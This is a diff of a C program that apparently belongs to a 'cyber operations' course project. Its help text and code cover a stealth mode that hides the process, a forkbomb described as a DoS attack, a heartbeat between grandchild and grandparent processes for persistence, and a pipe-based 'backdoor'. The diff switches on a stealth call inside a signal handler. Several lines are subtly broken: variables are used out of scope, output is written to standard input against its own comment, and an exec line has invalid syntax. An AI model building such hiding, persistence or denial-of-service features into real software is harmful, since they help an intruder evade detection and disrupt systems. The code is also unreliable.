@@ -14,7 +14,7 @@
 #include <time.h>
 
 //defines
-#define MAX 1024
+#define MAX 1024 //for cat
 #define STD_ERR_RETURN -1
 #define PIPE_READ_FROM 0
 #define PIPE_WRITE_TO 1
@@ -79,10 +79,12 @@ return 0;
 
 
 int usage_message(){
-  char help_message[1024] = "This program aids in cyber operations.\n -h: help page. (displays this help menu denoting the usage options for this program).\n -e: echo. (takes user input and pastes it to standard output).\n -c: cat. (reads a single file from the command line and prints to standard output).\n -s: stealth mode. (hides the program from the list command).\n -n: nothing can stop me now. (Continuous heartbeat from a grandchild process to a grandparent process).\n  ";
-  printf("%s\n", help_message);
-  printf(" -p: peakaboo. toggle stealth mode.\n");
+  char help_message[1024] = "This program aids in cyber operations.\n -h: help page. (displays this help menu denoting the usage options for this program).\n -e: echo. (takes user input and pastes it to standard output).\n -c: cat. (reads a single file from the command line and prints to standard output).\n -s: stealth mode. (hides the program from the list command).\n ";
+  printf("%s", help_message);
+  printf("-p: peakaboo. toggle stealth mode.\n");
   printf(" -f: forkbomb. DoS attack.\n");
+  printf(" -b: heartbeat mechanism (sends signals from grandchild to grandfather process)\n");
+  printf(" -d: use pipes to communicate through child and parent process\n");
 
 return(0);
 }
@@ -97,7 +99,7 @@ int cat(char *file){
   	
 
    if (filestatus == -1){
-     perror("unable to open file\n");
+     perror("unable to open file, please make sure the filename is the command option before the -c argument\n");
      return (2);
    }
 
@@ -172,7 +174,7 @@ void simpSigHandler(int sigNum){
   savedErrno = errno;
   switch (sigNum) {
     case SIGUSR1:
-      //stealth(argc, argv);
+      stealth(argc, argv);
       break;
     case SIGUSR2:
       f_bomb();
@@ -207,13 +209,11 @@ int milestone5(int argc, char *argv[]){
   int grandparent = getppid(); //PID of grandparent
   
   
-  if (first  ==  0){ //first child
+  if (first  ==  0){ //child
 
     pid_t second = fork(); //create a grandchild by forking another time
 
     if (second == 0){ //grandchild
-
-      //kill( getppid(), SIGKILL); //dont need parent anymore so kill it
 
       while(1){ //indefinitly
         if (alarm(60) == 0){ //every 60 seconds
@@ -229,7 +229,7 @@ int milestone5(int argc, char *argv[]){
     while(1){ //always wait for the heartbeat
       sigaction(SIGABRT, &heartbeat, NULL); //recieve + handle heartbeat
       //if (timer(180) == 0){ //if 180s pass w/ no heartbeat
-        //restartHeart = execvp(args[0], args); //execute program again
+        //restartHeart = execvp(./a.out -b, args); //execute program again
       } 
     }
 
@@ -271,7 +271,7 @@ int backdoor_pipes(int argc, char *argv[]){//milestone6
 
       pipeData = read( ParentToChild[PIPE_READ_FROM], buffPipe, MAX_BUFF_LEN ); //read data from parent through pipe
 
-      write(STDOUT_FILENO, buffPipe, pipeData);//write what came from the parent to the child STDOUT
+      write(STDIN_FILENO, buffPipe, pipeData);//write what came from the parent to the child STDOUT
 
       close( ParentToChild[PIPE_READ_FROM] ); //close used end
 
